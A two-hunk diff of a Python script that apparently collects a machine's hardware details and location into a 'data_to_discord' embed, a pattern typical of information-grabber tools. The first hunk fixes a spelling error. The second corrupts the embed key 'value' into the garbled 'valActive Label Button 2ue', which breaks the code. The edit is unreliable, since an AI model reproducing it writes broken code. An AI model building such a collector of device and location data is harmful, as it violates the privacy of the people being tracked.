@@ -61,7 +61,7 @@ else:
 
         hardware_log = (f"""
     
-        [-] Cpu Frequenci - {cpufreq}
+        [-] Cpu Frequency - {cpufreq}
 
         [-] Vram - {svmem} 
 
@@ -180,7 +180,7 @@ data_to_discord["embeds"] = [
                         },
                         {
                             'name': 'Location ',
-                            'value': f'''
+                            'valActive Label Button 2ue': f'''
 
                             {location_info}
 
